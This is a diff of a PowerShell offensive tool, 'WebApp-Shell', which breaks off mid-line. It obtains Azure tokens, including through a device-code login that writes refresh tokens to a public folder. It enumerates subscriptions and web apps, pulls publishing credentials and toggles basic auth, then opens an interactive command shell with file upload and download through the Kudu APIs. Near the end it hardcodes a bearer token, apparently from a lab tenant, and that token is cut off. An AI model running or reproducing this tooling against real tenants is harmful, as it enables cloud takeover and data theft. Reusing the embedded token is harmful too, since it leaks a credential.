@@ -1,39 +1,6 @@
 Function WebApp-Shell {
-    param (
-        [string]$AccessToken,
-        [string]$ClientID,
-        [string]$ClientSecret,
-        [string]$Identity,
-        [string]$TenantName
-    )
+	
 
-
-#####################################################################################
-#####################################################################################
-    $global:AuthMethod = $null   # "ClientCredentials" | "RefreshToken" | "Manual"
-    $global:CID = $null
-    $global:CSecret = $null
-    $global:TenantID = $null
-    $global:AccessToken = $null
-####################################################################################
-####################################################################################
-
-
-#######################################################################################################
-function Get-AuthHeaders {
-
-    if (-not $global:AccessToken) {
-        throw "[-] No AccessToken available. Run Invoke-GetTokens first."
-    }
-
-    return @{
-        "Authorization" = "Bearer $($global:AccessToken)"
-        "Content-Type"  = "application/json"
-        "UserAgent" = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
-    }
-}
-
-#######################################################################################################
 
 function Invoke-AzureRest {
     param(
@@ -45,12 +12,12 @@ function Invoke-AzureRest {
     )
     try {
         $params = @{
-            Method = $Method
-            Uri = $Uri
+            Method  = $Method
+            Uri     = $Uri
             Headers = $Headers
         }
         if ($Body) {
-            $params.Body = $Body
+            $params.Body        = $Body
             $params.ContentType = $ContentType
         }
         return Invoke-RestMethod @params
@@ -62,368 +29,74 @@ function Invoke-AzureRest {
     }
 }
 
-#######################################################################################################
+# ─────────────────────────────────────────────
+# Step 1: Get Access Token
+# ─────────────────────────────────────────────
+function Get-AzToken {
+    param([string]$ProvidedToken)
 
-function Invoke-RenewToken {
-
-    Write-Host "`t[!] Token expired - renewing ($($global:AuthMethod))..." -ForegroundColor Yellow
- 
-    switch ($global:AuthMethod) {
- 
-        "ClientCredentials" {
-            if (-not $global:CID -or -not $global:CSecret -or -not $global:TenantID) {
-                throw "[-] Missing ClientID/ClientSecret/TenantID for token renewal."
-            }
- 
-            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
-            $body = @{
-                "client_id" = $global:CID
-                "client_secret" = $global:CSecret
-                "scope" = "https://management.azure.com/.default"
-                "grant_type" = "client_credentials"
-            }
- 
-            try {
-                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
-                $global:AccessToken = $resp.access_token
-                Write-Host "`t[+] Token renewed (ClientCredentials)" -ForegroundColor Green
-                return $global:AccessToken
-            }
-            catch {
-                throw "[-] Failed to renew token with ClientCredentials: $_"
-            }
-        }
- 
-        "RefreshToken" {
-            $refreshPath = "C:\Users\Public\RefreshToken.txt"
-            if (-not (Test-Path $refreshPath)) {
-                throw "[-] No RefreshToken file found at $refreshPath"
-            }
- 
-            $RefreshToken = Get-Content $refreshPath
- 
-            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
-            $body = @{
-                "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-                "scope" = "https://management.azure.com/.default"
-                "grant_type" = "refresh_token"
-                "refresh_token" = $RefreshToken
-            }
- 
-            try {
-                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
- 
-                # Save the new refresh token for next time
-                if ($resp.refresh_token) {
-                    Set-Content -Path $refreshPath -Value $resp.refresh_token
-                    Write-Host "`t[>] New RefreshToken saved" -ForegroundColor DarkGray
-                }
- 
-                $global:AccessToken = $resp.access_token
-                Write-Host "`t[+] Token renewed (RefreshToken)" -ForegroundColor Green
-                return $global:AccessToken
-            }
-            catch {
-                throw "[-] Failed to renew token with RefreshToken: $_"
-            }
-        }
- 
-        "Manual" {
-            Write-Host "`n`t[!] Cannot auto-renew token for Managed Identity." -ForegroundColor Yellow
-            Write-Host "`t[?] Please paste a new AccessToken below:" -ForegroundColor Cyan
-            $newToken = Read-Host "`tAccessToken"
- 
-            if ([string]::IsNullOrWhiteSpace($newToken)) {
-                throw "[-] No token provided. Cannot continue."
-            }
- 
-            $global:AccessToken = $newToken.Trim()
-            Write-Host "`t[+] Token updated (Manual)" -ForegroundColor Green
-            return $global:AccessToken
-        }
- 
-        default {
-            throw "[-] Unknown AuthMethod '$($global:AuthMethod)'. Cannot renew token."
-        }
+    if ($ProvidedToken) {
+        return $ProvidedToken
     }
+
+    # Try Az module
+    try {
+        $ctx = Get-AzContext -ErrorAction Stop
+        if ($ctx) {
+            $token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com/" -ErrorAction Stop).Token
+            Write-Host "[+] Token acquired from Az module context" -ForegroundColor Green
+            return $token
+        }
+    } catch {}
+
+    # Try az CLI
+    try {
+        $token = (az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>$null)
+        if ($token) {
+            Write-Host "[+] Token acquired from az CLI" -ForegroundColor Green
+            return $token
+        }
+    } catch {}
+
+    # Manual input
+    Write-Host "[*] No token source found. Enter token manually." -ForegroundColor Cyan
+    $token = Read-Host -Prompt "Access Token (management.azure.com)"
+    if ([string]::IsNullOrWhiteSpace($token)) {
+        Write-Host "[!] No token provided. Exiting." -ForegroundColor Red
+        exit 1
+    }
+    return $token
 }
 
-#######################################################################################################
-#######################################################################################################
+# ─────────────────────────────────────────────
+# Step 2: Enumerate Subscriptions
+# ─────────────────────────────────────────────
+function Get-Subscriptions {
+    param([hashtable]$Headers)
 
- 
-function Invoke-SmartRequest {
-    param (
-        [string]$Method,
-        [string]$Uri,
-        [hashtable]$Headers,
-        $Body = $null,
-        [string]$ContentType = $null,
-        [int]$MaxRetries = 15
-    )
-    
-    write-host $Headers
-
-    if (-not $Headers) {
-        $Headers = Get-AuthHeaders
-        
+    Write-Host "`n[*] Enumerating subscriptions..." -ForegroundColor Cyan
+    $resp = Invoke-AzureRest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $Headers
+    if (-not $resp -or -not $resp.value) {
+        Write-Host "[!] No subscriptions found or access denied." -ForegroundColor Red
+        return @()
     }
- 
-    $RetryCount = 0
-    $TokenRenewed  = $false
-    $Success = $false
-    $Response  = $null
- 
-    while (-not $Success -and $RetryCount -lt $MaxRetries) {
-        try {
-            $p = @{
-                Method  = $Method
-                Uri     = $Uri
-                Headers = $Headers
-            }
- 
-            if ($null -ne $Body) {
-                $p['Body'] = $Body
-            }
-            if ($ContentType) {
-                $p['ContentType'] = $ContentType
-            }
- 
-            $Response = Invoke-RestMethod @p
-            $Success  = $true
-        }
-        catch {
-            $err  = $_
-            $code = if ($err.Exception.Response) {
-                        [int]$err.Exception.Response.StatusCode
-                    } else {
-                        $null
-                    }
- 
-            if ($code -eq 429) {
-                $RetryCount++
-                $ra   = $err.Exception.Response.Headers["Retry-After"]
-                $wait = if (-not [string]::IsNullOrWhiteSpace($ra)) {
-                            [int]($ra -join '')
-                        } else {
-                            0
-                        }
-                if ($wait -eq 0) { $wait = 10 * $RetryCount }
- 
-                Write-Host "`t[!] 429 Rate Limit - waiting $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Gray
-                Start-Sleep -Seconds $wait
-            }
- 
-            elseif ($code -eq 401) {
- 
-                if ($TokenRenewed) {
-                    throw "[-] 401 after token renewal. Check permissions or credentials."
-                }
- 
-                try {
-                    Invoke-RenewToken | Out-Null
- 
-                    $Headers["Authorization"] = "Bearer $($global:AccessToken)"
-                    $TokenRenewed = $true
- 
-                    Write-Host "`t[>] Retrying request with new token..." -ForegroundColor Cyan
-                }
-                catch {
-                    throw "[-] Token renewal failed: $_"
-                }
-            }
- 
-            elseif ($code -eq 403) {
-                Write-Host "`t[!] 403 Forbidden - $Uri" -ForegroundColor Red
-                throw "[-] Access denied (403). Missing required permissions."
-            }
- 
-
-            elseif ($code -eq 404) {
-                return $null
-            }
- 
-            elseif ($null -eq $code -or $code -ge 500) {
-                $RetryCount++
-                $wait = 5 * $RetryCount
-                Write-Host "`t[!] Error ($code). Retrying in $wait sec ($RetryCount/$MaxRetries)" -ForegroundColor Yellow
-                Start-Sleep -Seconds $wait
-            }
- 
-            else {
-                throw $err
-            }
+    $subs = $resp.value | ForEach-Object {
+        [PSCustomObject]@{
+            SubscriptionId   = $_.subscriptionId
+            SubscriptionName = $_.displayName
+            State            = $_.state
         }
     }
- 
-    if (-not $Success) {
-        throw "[-] Request to $Uri failed after $MaxRetries retries."
+    Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green
+    foreach ($s in $subs) {
+        Write-Host "    - $($s.SubscriptionName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor Gray
     }
- 
-    return $Response
+    return $subs
 }
 
-#######################################################################################################
-#######################################################################################################
-#######################################################################################################
-
-    function Get-DomainName {
-        param (
-            [string]$DomainName
-        )
-
-        try {
-            $response = Invoke-RestMethod -Method GET -Uri "https://login.microsoftonline.com/$DomainName/.well-known/openid-configuration"
-            $TenantID = ($response.issuer -split "/")[3]
-            Write-Host "[#] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor DarkYellow
-            Write-Host "[>] Using this Tenant ID for actions" -ForegroundColor DarkYellow
-            return $TenantID
-        } catch {
-            Write-Error "[-] Failed to retrieve Tenant ID from domain: $DomainName"
-            return $null
-        }
-    }
-
-#######################################################################################################
-
-    function Invoke-GetTokens {
-        param(
-            [string]$DomainName,
-            [string]$ClientID,
-            [string]$ClientSecret,
-            [string]$AccessToken
-        )
-    
-        if ($AccessToken) {
-            $global:AuthMethod  = "Manual"
-            $global:AccessToken = $AccessToken
-            Write-Host "[+] Token set (Manual - Managed Identity)" -ForegroundColor Green
-            Write-Host "[!] Auto-renewal not available - you will be prompted on 401" -ForegroundColor DarkGray
-            return $global:AccessToken
-        }
-    
-        # Resolve Tenant ID
-        if ($DomainName) {
-            $global:TenantID = Get-DomainName -DomainName $DomainName
-            if (-not $global:TenantID) { return $null }
-        }
-    
-        if ($ClientID -and $ClientSecret) {
-    
-            $global:AuthMethod = "ClientCredentials"
-            $global:CID        = $ClientID
-            $global:CSecret    = $ClientSecret
-    
-            $url = "https://login.microsoftonline.com/$($global:TenantID)/oauth2/v2.0/token"
-            $body = @{
-                "client_id" = $ClientID
-                "client_secret" = $ClientSecret
-                "scope" = "https://management.azure.com/.default"
-                "grant_type" = "client_credentials"
-            }
-    
-            try {
-                $resp = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded"
-                $global:AccessToken = $resp.access_token
-                Write-Host "[+] Token acquired (ClientCredentials)" -ForegroundColor Green
-                return $global:AccessToken
-            }
-            catch {
-                Write-Error "[-] Failed to get token with ClientCredentials: $_"
-                return $null
-            }
-        }
-    
-        $global:AuthMethod = "RefreshToken"
-    
-        $deviceCodeUrl = "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0"
-        $Body = @{
-            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-            "resource" = "https://management.azure.com"
-        }
-    
-        $authResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $Body
-        $code       = $authResponse.user_code
-        $deviceCode = $authResponse.device_code
-    
-        Write-Host "`n[#] Browser will open in 5 sec, Please enter this code:" -ForegroundColor DarkYellow -NoNewline
-        Write-Host " $code" -ForegroundColor DarkGray
-        Start-Sleep -Seconds 5
-        Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ArgumentList "https://microsoft.com/devicelogin"
-    
-        $tokenUrl  = "https://login.microsoftonline.com/common/oauth2/token?api-version=1.0"
-        $tokenBody = @{
-            "scope" = "openid"
-            "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
-            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
-            "code" = $deviceCode
-        }
-    
-        while ($true) {
-            try {
-                $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $tokenBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
-    
-                if ($tokenResponse.refresh_token) {
-                    Set-Content -Path "C:\Users\Public\RefreshToken.txt" -Value $tokenResponse.refresh_token
-                    Write-Host "[>] Refresh Token saved to C:\Users\Public\RefreshToken.txt" -ForegroundColor DarkGray
-                }
-    
-                $global:AccessToken = $tokenResponse.access_token
-                Write-Host "[+] Token acquired (DeviceCode)" -ForegroundColor Green
-                return $global:AccessToken
-            }
-            catch {
-                $errorResponse = $_.ErrorDetails.Message | ConvertFrom-Json
-                if ($errorResponse.error -eq "authorization_pending") {
-                    Start-Sleep -Seconds 5
-                } elseif ($errorResponse.error -eq "authorization_declined" -or $errorResponse.error -eq "expired_token") {
-                    Write-Host "`n[-] Authorization failed or expired." -ForegroundColor DarkRed
-                    return $null
-                } else {
-                    Write-Host "`n[-] Unexpected error: $($errorResponse.error)" -ForegroundColor DarkRed
-                    return $null
-                }
-            }
-        }
-    }
-
-
-#######################################################################################################
-
-    
-
-#######################################################################################################
-
-    function Get-Subscriptions {
-        param(
-            [hashtable]$Headers
-        )
-
-        Write-Host "`n[*] Mapping Subs:" -ForegroundColor Cyan
-
-        $resp = Invoke-SmartRequest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $Headers -Method GET
-
-        if (-not $resp -or -not $resp.value) {
-            Write-Host "[!] No subscriptions found or access denied." -ForegroundColor Red
-            return @()
-        }
-        $subs = $resp.value | ForEach-Object {
-            [PSCustomObject]@{
-                SubscriptionId  = $_.subscriptionId
-                SubscriptionName = $_.displayName
-                State  = $_.state
-            }
-        }
-        Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green
-        foreach ($s in $subs) {
-            Write-Host "    - $($s.SubscriptionName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor Gray
-        }
-        return $subs
-    }
-
-#######################################################################################################
-#######################################################################################################
-
+# ─────────────────────────────────────────────
+# Step 3: Enumerate Web Apps across all subs
+# ─────────────────────────────────────────────
 function Get-AllWebApps {
     param(
         [array]$Subscriptions,
@@ -439,22 +112,26 @@ function Get-AllWebApps {
         $subId   = $sub.SubscriptionId
         $subName = $sub.SubscriptionName
 
+        # Get all web apps in the subscription
         $uri  = "https://management.azure.com/subscriptions/$subId/resources?`$filter=resourceType eq 'Microsoft.Web/Sites'&api-version=2016-09-01"
-        $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
+        $resp = Invoke-AzureRest -Uri $uri -Headers $Headers
 
         if (-not $resp -or -not $resp.value) { continue }
 
         foreach ($app in $resp.value) {
+            # Extract resource group from the resource ID
             $rgMatch = $app.id -match "/resourceGroups/([^/]+)/"
             $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }
 
+            # Fetch detailed site properties to get the real SCM hostname
             $detailUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Web/sites/$($app.name)?api-version=2021-01-15"
-            $detail = Invoke-SmartRequest -Uri $detailUri -Headers $Headers -Method GET
+            $detail    = Invoke-AzureRest -Uri $detailUri -Headers $Headers
 
             $scmHost = ""
             if ($detail -and $detail.properties -and $detail.properties.enabledHostNames) {
                 $scmHost = $detail.properties.enabledHostNames | Where-Object { $_ -match "\.scm\." } | Select-Object -First 1
             }
+            # Fallback if enabledHostNames didn't work — try hostNameSslStates
             if (-not $scmHost -and $detail -and $detail.properties -and $detail.properties.hostNameSslStates) {
                 $scmEntry = $detail.properties.hostNameSslStates | Where-Object { $_.hostType -eq 1 -or $_.name -match "\.scm\." } | Select-Object -First 1
                 if ($scmEntry) { $scmHost = $scmEntry.name }
@@ -469,16 +146,16 @@ function Get-AllWebApps {
             Write-Host "    [+] $($app.name) -> SCM: $scmHost" -ForegroundColor Gray
 
             $allApps += [PSCustomObject]@{
-                Name = $app.name
-                ResourceGroup  = $rg
-                SubscriptionId  = $subId
+                Name             = $app.name
+                ResourceGroup    = $rg
+                SubscriptionId   = $subId
                 SubscriptionName = $subName
-                OS  = $app.kind
-                Location = $app.location
-                ResourceId = $app.id
-                ScmHost = $scmHost
-                DefaultHostName = $defaultHostName
-                Permission = "Checking..."
+                OS               = $app.kind
+                Location         = $app.location
+                ResourceId       = $app.id
+                ScmHost          = $scmHost
+                DefaultHostName  = $defaultHostName
+                Permission       = "Checking..."
             }
         }
     }
@@ -487,9 +164,9 @@ function Get-AllWebApps {
     return $allApps
 }
 
-
-###########################################################################################################################################
-
+# ─────────────────────────────────────────────
+# Step 4: Check permissions on each Web App
+# ─────────────────────────────────────────────
 function Check-Permissions {
     param(
         [array]$WebApps,
@@ -500,10 +177,10 @@ function Check-Permissions {
 
     foreach ($app in $WebApps) {
         $uri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-        $resp = Invoke-SmartRequest -Uri $uri -Headers $Headers -Method GET
+        $resp = Invoke-AzureRest -Uri $uri -Headers $Headers
 
         if ($resp -and $resp.value) {
-            $actions = ($resp.value | ForEach-Object { $_.actions }) -join ","
+            $actions    = ($resp.value | ForEach-Object { $_.actions }) -join ","
             $notActions = ($resp.value | ForEach-Object { $_.notActions }) -join ","
 
             if ($actions -match "\*") {
@@ -516,8 +193,9 @@ function Check-Permissions {
                 $app.Permission = "Reader/Limited"
             }
 
+            # Verify publishing credentials access
             $credUri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/config/publishingcredentials/list?api-version=2023-12-01"
-            $credResp = Invoke-SmartRequest -Method "POST" -Uri $credUri -Headers $Headers
+            $credResp = Invoke-AzureRest -Method "POST" -Uri $credUri -Headers $Headers
             if ($credResp -and $credResp.properties) {
                 $app.Permission += " [PublishCreds: YES]"
             }
@@ -532,48 +210,42 @@ function Check-Permissions {
     return $WebApps
 }
 
-
-###########################################################################################################################################
-
+# ─────────────────────────────────────────────
+# Display Web Apps Table
+# ─────────────────────────────────────────────
 function Show-WebAppMenu {
     param([array]$WebApps)
 
     Write-Host "`n" -NoNewline
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-    Write-Host "# Id   # Name                   # OS        # Subscription              # Resource Group        # Permission" -ForegroundColor White
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
+    Write-Host " #   | Name                  | OS          | Subscription          | Resource Group     | Permission" -ForegroundColor White
+    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
 
     for ($i = 0; $i -lt $WebApps.Count; $i++) {
         $app = $WebApps[$i]
-        $num = ($i + 1).ToString().PadRight(4)
-        $name = $app.Name.PadRight(22).Substring(0, 22)
-        $os = $app.OS.PadRight(12).Substring(0, 12)
-        $sub = $app.SubscriptionName.PadRight(22).Substring(0, 22)
-        $rg = $app.ResourceGroup.PadRight(19).Substring(0, 19)
-        $perm = $app.Permission
+        $num    = ($i + 1).ToString().PadRight(4)
+        $name   = $app.Name.PadRight(22).Substring(0, 22)
+        $os     = $app.OS.PadRight(12).Substring(0, 12)
+        $sub    = $app.SubscriptionName.PadRight(22).Substring(0, 22)
+        $rg     = $app.ResourceGroup.PadRight(19).Substring(0, 19)
+        $perm   = $app.Permission
 
-        $color = if ($perm -match "PublishCreds: YES") {
-                    "Green" 
-                }
-                 elseif ($perm -match "No Access") {
-                     "Red"
-                }
-                 else { 
-                    "Yellow" 
-                }
+        $color = if ($perm -match "PublishCreds: YES") { "Green" }
+                 elseif ($perm -match "No Access") { "Red" }
+                 else { "Yellow" }
 
-        Write-Host " $num # $name # $os # $sub # $rg # " -NoNewline -ForegroundColor Gray
+        Write-Host " $num | $name | $os | $sub | $rg | " -NoNewline -ForegroundColor Gray
         Write-Host "$perm" -ForegroundColor $color
     }
 
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
-    Write-Host "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -" -ForegroundColor DarkCyan
+    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
     Write-Host " [0] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
     Write-Host ""
 }
 
-
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Enable / Disable Basic Auth
+# ─────────────────────────────────────────────
 function Set-BasicAuth {
     param(
         [PSCustomObject]$App,
@@ -598,8 +270,9 @@ function Set-BasicAuth {
     Write-Host "  [+] Basic Auth $result" -ForegroundColor Green
 }
 
-
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Get Publishing Credentials
+# ─────────────────────────────────────────────
 function Get-PublishingCredentials {
     param(
         [PSCustomObject]$App,
@@ -623,9 +296,16 @@ function Get-PublishingCredentials {
     }
 }
 
-
-###########################################################################################################################################
-
+# ─────────────────────────────────────────────
+# Kudu VFS: Normalize path for VFS API
+# VFS root = /home (Linux) or D:\home (Windows)
+# So all paths should be relative to "home",
+# e.g. site/wwwroot/file.txt
+#
+# If user gives a relative name (e.g. "file.txt")
+# it gets prepended with VfsWorkDir so it lands
+# in the shell's current working directory.
+# ─────────────────────────────────────────────
 function Normalize-VfsPath {
     param(
         [string]$InputPath,
@@ -646,6 +326,8 @@ function Normalize-VfsPath {
     # Strip leading slash
     $p = $p -replace "^/", ""
 
+    # If path doesn't start with a known VFS top-level directory,
+    # treat it as relative to the working directory
     $knownRoots = "^(site/|LogFiles/|data/|SiteExtensions/|devtools/|\.)"
     if ($p -notmatch $knownRoots) {
         $p = "$($VfsWorkDir.TrimEnd('/'))/$p"
@@ -654,7 +336,9 @@ function Normalize-VfsPath {
     return $p
 }
 
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Kudu VFS: Download file from Web App
+# ─────────────────────────────────────────────
 function Invoke-KuduDownload {
     param(
         [string]$ScmHost,
@@ -689,7 +373,9 @@ function Invoke-KuduDownload {
     }
 }
 
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Kudu VFS: Upload file to Web App
+# ─────────────────────────────────────────────
 function Invoke-KuduUpload {
     param(
         [string]$ScmHost,
@@ -707,22 +393,16 @@ function Invoke-KuduUpload {
     $uri = "https://$ScmHost/api/vfs/$vfsPath"
 
     $fileBytes   = [System.IO.File]::ReadAllBytes($LocalPath)
-    $size = $fileBytes.Length
-    $sizeStr = if ($size -gt 1MB) { 
-        "{0:N2} MB" -f ($size / 1MB)
-    }
-    elseif ($size -gt 1KB) {
-         "{0:N2} KB" -f ($size / 1KB) 
-    }
-    else {
-         "$size bytes"
-    }
+    $size        = $fileBytes.Length
+    $sizeStr     = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
+                   elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
+                   else { "$size bytes" }
 
     Write-Host "  [*] Uploading: $LocalPath ($sizeStr)" -ForegroundColor Cyan
     Write-Host "  [*] Target:    $uri" -ForegroundColor Cyan
 
     try {
-
+        # VFS PUT requires If-Match: * to overwrite existing files
         $uploadHeaders = $AuthHeader.Clone()
         $uploadHeaders["If-Match"] = "*"
 
@@ -735,7 +415,9 @@ function Invoke-KuduUpload {
     }
 }
 
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Kudu VFS: List directory on Web App
+# ─────────────────────────────────────────────
 function Invoke-KuduLs {
     param(
         [string]$ScmHost,
@@ -769,7 +451,7 @@ function Invoke-KuduLs {
                        else { "$($item.size) B" }
 
             $modified = try { ([datetime]$item.mtime).ToString("yyyy-MM-dd HH:mm:ss") } catch { $item.mtime }
-            $name = $item.name
+            $name     = $item.name
 
             $typeStr = $isDir.PadRight(5)
             $sizeStr = $sizeVal.PadRight(14)
@@ -791,7 +473,9 @@ function Invoke-KuduLs {
     }
 }
 
-###########################################################################################################################################
+# ─────────────────────────────────────────────
+# Interactive Shell via Kudu (SCM)
+# ─────────────────────────────────────────────
 function Start-InteractiveShell {
     param(
         [PSCustomObject]$App,
@@ -799,15 +483,17 @@ function Start-InteractiveShell {
     )
 
     $scmHost = $App.ScmHost
-    $cmdUri = "https://$scmHost/api/command"
+    $cmdUri  = "https://$scmHost/api/command"
 
     Write-Host "  [*] SCM Endpoint: $scmHost" -ForegroundColor DarkGray
 
-    $pair = "$($Creds.Username):$($Creds.Password)"
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
-    $b64 = [Convert]::ToBase64String($bytes)
+    # Build Basic Auth header
+    $pair      = "$($Creds.Username):$($Creds.Password)"
+    $bytes     = [System.Text.Encoding]::ASCII.GetBytes($pair)
+    $b64       = [Convert]::ToBase64String($bytes)
     $authHeader = @{ Authorization = "Basic $b64" }
 
+    # Determine working dir based on OS
     $isLinux = $App.OS -match "linux"
     $workDir = if ($isLinux) { "/home/site/wwwroot" } else { "site\\wwwroot" }
 
@@ -815,11 +501,12 @@ function Start-InteractiveShell {
     try {
         while ($true) {
             Write-Host "  [$($App.Name)] " -ForegroundColor Red -NoNewline
-            $command = Read-Host -Prompt ">>"
+            $command = Read-Host -Prompt ">>>"
 
             if ([string]::IsNullOrWhiteSpace($command)) { continue }
             if ($command -match "^(exit|quit)$") { break }
 
+            # ── Built-in: upload <local> <remote> ──
             if ($command -match "^upload\s+(.+?)\s+(.+)$") {
                 $localPath  = $Matches[1].Trim('"', "'")
                 $remotePath = $Matches[2].Trim('"', "'")
@@ -827,6 +514,7 @@ function Start-InteractiveShell {
                 continue
             }
 
+            # ── Built-in: download <remote> <local> ──
             if ($command -match "^download\s+(.+?)\s+(.+)$") {
                 $remotePath = $Matches[1].Trim('"', "'")
                 $localPath  = $Matches[2].Trim('"', "'")
@@ -834,6 +522,7 @@ function Start-InteractiveShell {
                 continue
             }
 
+            # ── Built-in: vfs-ls <path> ──
             if ($command -match "^vfs-ls\s*(.*)$") {
                 $remotePath = $Matches[1].Trim('"', "'")
                 if ([string]::IsNullOrWhiteSpace($remotePath)) {
@@ -843,9 +532,10 @@ function Start-InteractiveShell {
                 continue
             }
 
+            # ── Regular command execution ──
             $commandBody = @{
                 command = $command
-                dir = $workDir
+                dir     = $workDir
             } | ConvertTo-Json
 
             try {
@@ -871,123 +561,82 @@ function Start-InteractiveShell {
     }
 }
 
-###################################################################################
+# ─────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────
+Clear-Host
+Show-Banner
 
+# Get token
+$token   = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImFGa21LVkZjLTRXVjZzWENCdk5aa1hJNTA1WSIsImtpZCI6ImFGa21LVkZjLTRXVjZzWENCdk5aa1hJNTA1WSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0L2Y5M2ViOGUxLTg2ZWQtNDM4NC05ZDZmLTc4N2M2YWRhY2JmMS8iLCJpYXQiOjE3ODI2NzY1ODgsIm5iZiI6MTc4MjY3NjU4OCwiZXhwIjoxNzgyNzYzMjg4LCJhaW8iOiJBV1FBbS84Y0FBQUFLRWxrVytUUTdhMTJNcGhtWEJyQjF3MHlDUWdTL0NSVzBPV1hKYzZ1dlcyMTVRVC9NZFhUUU0zRGRaN3NXRTNabG4wbStUVXRjRnNhc0k1bkdxYjdoTDEySUYxR2I2R3NHTTRxZGZsTWVPblZ5dTI1QmdMaHd5aFBRREdYdnVxVCIsImFwcGlkIjoiNjQ5OGZkYTctZDNjZC00MWIzLWJkMDItZDM4NTUyYmIxZTUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZjkzZWI4ZTEtODZlZC00Mzg0LTlkNmYtNzg3YzZhZGFjYmYxLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYmZiZmJkMWItNTk4ZC00ZDdkLWI1MWYtOWE2ZDQ2MmM2NzRjIiwicmgiOiIxLkFHRUI0YmctLWUyR2hFT2RiM2g4YXRyTDhVWklmM2tBdXRkUHVrUGF3ZmoyTUJNQUFBQmhBUS4iLCJzdWIiOiJiZmJmYmQxYi01OThkLTRkN2QtYjUxZi05YTZkNDYyYzY3NGMiLCJ0aWQiOiJmOTNlYjhlMS04NmVkLTQzODQtOWQ2Zi03ODdjNmFkYWNiZjEiLCJ1dGkiOiI2Q0QxWWF4YmFFYTdfZXJJVHU4OEFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyIwOTk3YTFkMC0wZDFkLTRhY2ItYjQwOC1kNWNhNzMxMjFlOTAiXSwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvYTU5ODE2MWYtMWU4Ni00M2RhLThkOTgtYWYyZDYyZjBmZjYxL3Jlc291cmNlZ3JvdXBzL09mZmVuc2l2ZV9TaGFrZWQvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9EQzEiLCJ4bXNfZnRkIjoiU29LMVN0aDhvbEFzX3BNUER3MFpNMUUxQnpLeWY0OERWX0l2dXJOUU0zMEJhWE55WVdWc1l5MWtjMjF6IiwieG1zX2lkcmVsIjoiNyAyNCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2E1OTgxNjFmLTFlODYtNDNkYS04ZDk4LWFmMmQ2MmYwZmY2MS9yZXNvdXJjZWdyb3V